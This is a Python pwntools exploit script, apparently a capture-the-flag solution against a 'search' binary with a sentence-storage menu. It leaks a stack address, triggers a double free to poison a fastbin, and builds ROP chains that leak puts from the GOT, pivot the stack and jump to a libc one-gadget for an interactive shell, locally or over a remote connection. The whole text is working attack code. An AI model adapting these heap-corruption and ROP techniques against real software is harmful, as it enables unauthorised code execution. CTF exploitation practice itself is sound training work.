from pwn import *
import time
import sys


def create_sentence(size, sentence):
    proc.sendline('2')  # menu
    proc.sendline(str(size))
    sentence += ' ' * (size - len(sentence))
    proc.send(sentence)
    proc.recvuntil('Added sentence')


def delete_sentence(sentence):
    proc.sendline('1')
    proc.sendline(str(len(sentence)))
    proc.send(sentence)
    proc.sendline('y')
    proc.recvuntil('Deleted!')


def search_sentence(size, sentence):
    proc.sendline('1')
    proc.sendline(str(size))
    proc.recvuntil('Enter the word:')
    sentence += ' ' * (size - len(sentence))
    proc.send(sentence)


def exploit():
    raw_input('wait')
    proc.recvuntil('Quit\n')
    proc.sendline('a' * 48)
    proc.recvuntil('is not a valid number\n')
    proc.sendline('b' * 48)
    proc.recv(48)
    leak = proc.recvuntil('is not a valid number\n')
    leak = u64(leak[:6] + '\x00\x00')
    leak += 0x52
    print hex(leak)
    create_sentence(0x30, '        a')
    create_sentence(0x30, 'b')
    create_sentence(0x30, 'c')
    delete_sentence('b')
    delete_sentence('a')
    search_sentence(0x30, '        a')
    raw_input('search_finish')
    delete_sentence('c')
    delete_sentence('a')  # double free!!
    raw_input('double free')
    create_sentence(0x30, p64(leak))  # let leak into fastbin
    create_sentence(0x30, 'b')
    create_sentence(0x30, 'c')

    pop_rsi = 0x0000000000400a24
    pop_rdi = 0x0000000000400e23
    pop_rsp_r13_r14 = 0x0000000000400a20
    puts_plt = 0x4007a0
    puts_got = 0x000000000602028
    system_magic = 0x4526a
    input_sentence = 0x0000000004009B0

    leak += 16 + 6 + 8 * 5  # expand stack address
    new_stack = leak + 0x200
    buf = '\x00' * 6
    buf += flat([pop_rdi, leak, pop_rsi, 0x50, input_sentence])
    assert len(buf) <= 0x30, 'buf too long'
    create_sentence(0x30, buf)

    proc.recvuntil('3: Quit\n')
    proc.sendline('3')

    buf = flat([pop_rdi, puts_got, puts_plt, pop_rdi, new_stack, pop_rsi,
                0x88, input_sentence, pop_rsp_r13_r14, new_stack])
    # assert '\n' not in buf, 'buf contain newline'
    proc.send(buf)
    puts_libc = u64(proc.recv(6) + '\x00\x00')
    print hex(puts_libc)
    system_magic += puts_libc - 0x6f690

    buf = flat([0, 0, system_magic])
    buf += '\x00' * 0x70
    proc.send(buf)


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc localhost port'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./search'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
